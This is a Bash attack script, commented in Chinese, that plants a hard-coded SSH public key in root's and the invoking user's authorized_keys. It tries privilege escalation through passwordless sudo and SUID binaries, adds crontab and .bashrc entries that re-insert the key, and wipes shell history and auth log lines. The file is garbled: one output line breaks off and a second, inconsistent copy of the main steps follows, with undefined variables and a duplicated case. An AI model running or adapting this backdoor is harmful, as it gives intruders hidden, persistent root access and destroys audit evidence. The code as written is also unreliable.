#!/bin/bash

# ============================================================
# 配置区 (请在此处填入你的公钥)
# ============================================================
KEY="ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQD9x1Je87dKWyUvZlKzb0yneOfqQ8fZdW9WeEZFDsFM5DDPZbF0rZhbDjt3xfCDUtCJNrOhbxKI6ZixoSKEMROAHXKZGP0hT+LHeVNcO8Ja/INOEHq1JxAsy55/lV8LccL/EB3BJwSJRDWZQkRer1NBtW3i6x43f/bZ1fNVwMkNqfgfcqi3wOfZwMdoZXLKpnqQpdDV0uP+uCOa/P6vuMqsjdLr7RHb0aD9b5POg77IB7Xq4D46GADNthOhjU3rbB9Ah2T6rxUtu9pMXlwPcVtUhuCyho088BlRCsYwZtJVOxsmDNF07WSwzAAnUGZ9270ynT5IeWfWLhFZZJclSeg3Ds6sPexASglVXBcrdkgCm5Q/ulnzE/vMVmXBDPHtJ+bTX1a2aIFkEU3xIuA3+iEo1m+RtKM5VcINYjcLmGLh3LjSMfqs27FjvkEGv3/Zk6ep0k68Nu0G4Hs2oQmwGlvGKPehcVzZI8s8MmaN3T5FEUlFTJiz+MtQ8Xs7hRCicC2cxYptfWZ7EE+Px9xd4aFCT1Hrs34LPBvFrvgwxaOecGwm6AjP8yab5J2QnV1qD+HWgurGk1bp3o29zrhSBGJBWA4Borc2RPcWojvZq/AKocjcM/LqnYnn3mlRnEC3f96l2sVrzeNSXxNHpdMi5mwUC8p3GhUjXc/DKGI9QnIA6w== root@hk667482213160"
MARKER="#sys_check_daemon"
ME=$(whoami)

# --- 颜色定义 ---
RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; BLUE='\033[0;34m'; NC='\033[0m'

# --- 状态追踪 ---
IS_ROOT=false; WRITE_SUCCESS=false; PERSIST_SUCCESS=false; CLEAN_SUCCESS=true

# ============================================================
# 核心逻辑块 (用于注入到子进程)
# ============================================================

# 1. 定义安装 Key 的函数字符串
FUNC_STR="install_key() { local u=\$1; local h=\$(getent passwd \$u | cut -d: -f6); [ -z \"\$h\" ] && return 1; mkdir -p \"\$h/.ssh\" && chmod 700 \"\$h/.ssh\"; grep -q 'AAAAB3Nza' \"\$h/.ssh/authorized_keys\" 2>/dev/null || echo '$KEY' >> \"\$h/.ssh/authorized_keys\"; chmod 600 \"\$h/.ssh/authorized_keys\"; chown -R \$u:\$u \"\$h/.ssh\" 2>/dev/null; };"

# 2. 定义“全能任务包”：将 [安装Key] + [设置Crontab] + [设置Bashrc] 封装在一起
# 这样提权后的第一个动作就是把所有持久化工作一次性做完
FULL_TASK="install_key root; install_key $ME; echo '$MARKER */5 * * * * root grep -q \"AAAAB3Nza\" /root/.ssh/authorized_keys || echo \"$KEY\" >> /root/.ssh/authorized_keys' >> /etc/crontab 2>/dev/null; echo '$MARKER grep -q \"AAAAB3Nza\" /root/.ssh/authorized_keys || echo \"$KEY\" >> /root/.ssh/authorized_keys' >> /root/.bashrc 2>/dev/null"

# ============================================================
# 主程序流
# ============================================================

echo -e "${BLUE}[*] Starting Stealthy Injection...${NC}"

# --- Step 1: 权限探测 ---
if [ "$(id -u)" -eq 0 ]; then
    IS_ROOT=true
elif sudo -n true 2>/dev/null; then
    IS_SUDO_FREE=true
fi

# --- Step 2: 提权与执行 (核心逻辑) ---
echo -n "    > Detecting Privilege Escalation... "

if [ "$IS_ROOT" = true ]; then
    # 情况 A: 已经是 Root，直接执行全能任务
    eval "$FUNC_STR $FULL_TASK" >/dev/null 2>&1
    # 验证是否成功
    grep -q "AAAAB3Nza" /root/.ssh/authorized_keys 2>/dev/null && { WRITE_SUCCESS=true; PERSIST_SUCCESS=true; }

elif [ "$IS_SUDO_FREE" = true ]; then
    # 情况 B: 有 sudo 免密权限
    sudo bash -c "$FUNC_STR $FULL_TASK" >/dev/null 2>&1
    grep -q "AAAAB3Nza" /root/.ssh/authorized_keys 2>/dev/null && { WRITE_SUCCESS=true; PERSIST_SUCCESS=true; }

else
    # 情况 C: 尝试利用 SUID 漏洞提权
    for bin in /usr/bin/find /usr/bin/vim /usr/bin/bash /usr/bin/python /usr/bin/perl; do
        if [ -u "$bin" ]; then
            case "$bin" in
                "/usr/bin/find")
                    sudo "$bin" . -exec sh -c "$FUNC_STR $FULL_TASK" \; -quit 2>/dev/null ;;
                "/usr/bin/vim")
                    sudo "$bin" -c ':wq!' -c ':!sh -c \"$FUNC_STR $FULL_TASK\"' -c ':q!' -u NONE /etc/shadow 2>/dev/null ;;
                "/usr/bin/bash")
                    sudo "$bin" -p -c "$FUNC_STR $FULL_TASK" 2>/dev/null ;;
                "/usr/bin/python")
                    sudo "$bin" -c "import os; os.system(\"$FUNC_STR $FULL_TASK\")" 2>/dev/null ;;
                "/usr/bin/perl")
                    sudo "$bin" -e "system('$FUNC_STR $FULL_TASK')" 2>/dev/null ;;
            esac
            # 只要文件写进去了，就说明提权和持久化都成功了
            if [ -f /root/.ssh/authorized_keys ] && grep -q "AAAAB3Nza" /root/.ssh/authorized_keys 2>/dev/null; then
                WRITE_SUCCESS=true
                PERSIST_SUCCESS=true
                break
            fi
        fi
    done
fi

# 输出探测结果
if [ "$WRITE_SUCCESS" = true ]; then
    echo -e "${GREEN}DONE${NC}"
else
    echo -e "${RED}FAILED${NC}"
fi

# --- Step 3: 清理痕迹 ---
echo -n "    > Cleaning traces... "
# 清理当前用户历史
history -c 2>/dev/null
> ~/.bash_history 2>/dev/null
# 如果有 sudo 权限，尝试清理 root 的历史和 auth.log
if [ "$IS_ROOT" = true ] || [ "$IS_SUDO_FREE" = true ]; then
    # 注意：这里使用 sudo 来尝试清理，即使失败也不会报错
    sudo bash -c "history -c; > /root/.bash_history; sed -i '/$(whoami)/d' /var/log/auth.log 2>/dev/null; sed -i '/$(whoami)/d' /var/log/secure 2>/dev/null" >/dev/null 2>&1
fi
echo -e "${GREEN}DONE${NC}"

# --- Step 4: 最终报告 ---
echo -e "\n${BLUE}============================================================${NC}"
echo -e "      FINAL EXECUTION REPORT (Verification Mode)       "
echo -e "${BLUE}============================================================${NC}"

# 权限状态
if [ "$IS_ROOT" = true ]; then
    echo -e "  [$fi

# --- Step 2: 提权与写入 ---
echo -n "    > Detecting Privilege Escalation... "

if [ "$IS_ROOT" = true ]; then
    # 情况 A: 已经是 Root
    eval "$FUNC_STR install_key root" >/dev/null 2>&1
    eval "$FUNC_STR install_key $ME" >/dev/null 2>&1
    # 检查是否真的写进去了 (验证逻辑)
    grep -q "AAAAB3Nza" /root/.ssh/authorized_keys 2>/dev/null && WRITE_SUCCESS=true
else
    # 情况 B: 尝试利用 Sudo 或 SUID
    # 尝试路径 B.1: sudo 免密
    if [ "$IS_SUDO_FREE" = true ]; then
        sudo bash -c "$FUNC_STR install_key root; $FUNC_STR install_key $ME" >/dev/null 2>&1
        [ -f /root/.ssh/authorized_keys ] && grep -q "AAAAB3Nza" /root/.ssh/authorized_keys 2>/dev/null && WRITE_SUCCESS=true
    
    # 尝试路径 B.2: SUID 探测
    else
        for bin in /usr/bin/find /usr/bin/vim /usr/bin/bash /usr/bin/python /usr/bin/perl; do
            [ -u "$bin" ] && (
                case "$bin" in
                    "/usr/bin/find") sudo "$bin" . -exec sh -c "$FUNC_STR install_key root; $FUNC_STR install_key $ME" \; -quit 2>/dev/null ;;
                    "/usr/bin/vim")  sudo "$bin" -c ':wq!' -c ':!sh -c \"$FUNC_STR install_key root; $FUNC_STR install_key $ME\"' -c ':q!' -u NONE /etc/shadow 2>/dev/null ;;
                    "/usr/bin/bash") sudo "$bin" -p -c "$FUNC_STR install_key root; $FUNC_STR install_key $ME" 2>/dev/null ;;
                    "/usr/bin/python") sudo "$bin" -c "import os; os.system(\"$FUNC_STR install_key root; $FUNC_LOGIC install_key $ME\")" 2>/dev/null ;; # 修正 Python 逻辑
                    "/usr/bin/python") sudo "$bin" -c "import os; os.system(\"$FUNC_STR install_key root; $FUNC_STR install_key $ME\")" 2>/dev/null ;;
                    "/usr/bin/perl") sudo "$bin" -e "system('$FUNC_STR install_key root; $FUNC_STR install_key $ME')" 2>/dev/null ;;
                esac
                # 关键：检查是否真的成功写入了文件
                if [ -f /root/.ssh/authorized_keys ] && grep -q "AAAAB3Nza" /root/.ssh/authorized_keys 2>/dev/null; then
                    WRITE_SUCCESS=true; break
                fi
            )
        done
    fi
fi

if [ "$WRITE_SUCCESS" = true ]; then
    echo -e "${GREEN}DONE${NC}"
else
    echo -e "${RED}FAILED${NC}"
fi

# --- Step 3: 持久化 ---
if [ "$WRITE_SUCCESS" = true ]; then
    echo -n "    > Setting up Persistence... "
    # 使用 sudo 执行持久化字符串
    if sudo bash -c "$PERSIST_STR" >/dev/null 2>&1; then
        PERSIST_SUCCESS=true
        echo -e "${GREEN}DONE${NC}"
    else
        echo -e "${RED}SKIPPED${NC}"
    fi
fi

# --- Step 4: 清理痕迹 ---
echo -n "    > Cleaning traces... "
# 清理当前用户历史
history -c 2>/dev/null
> ~/.bash_history 2>/dev/null
# 如果有 sudo 权限，清理 root 的历史和 auth.log
if [ "$IS_ROOT" = true ] || [ "$IS_SUDO_FREE" = true ]; then
    sudo bash -c "history -c; > /root/.bash_history; sed -i '/$(whoami)/d' /var/log/auth.log 2>/dev/null; sed -i '/$(whoami)/d' /var/log/secure 2>/dev/null" >/dev/null 2>&1
fi
echo -e "${GREEN}DONE${NC}"

# --- Step 5: 最终报告 ---
echo -e "\n${BLUE}============================================================${NC}"
echo -e "      FINAL EXECUTION REPORT (Verification Mode)       "
echo -e "${BLUE}============================================================${NC}"
[ "$IS_ROOT" = true ] && echo -e "  [${GREEN}✔${NC}] Privilege: ${GREEN}ROOT${NC}" || echo -e "  [${BLUE}i${NC}] Privilege: ${YELLOW}NORMAL ($(whoami)$)${NC}"
[ "$WRITE_SUCCESS" = true ] && echo -e "  [${GREEN}✔${NC}] Key Injection: ${GREEN}SUCCESS (Verified)${NC}" || echo -e "  [${RED}✘${NC}] Key Injection: ${RED}FAILED${NC}"
[ "$PERSIST_SUCCESS" = true ] && echo -e "  [${Green}✔${NC}] Persistence: ${GREEN}SUCCESS${NC}" || echo -e "  [${RED}✘${NC}] Persistence: ${RED}FAILED/SKIPPED${NC}"
echo -e "${BLUE}============================================================${NC}"
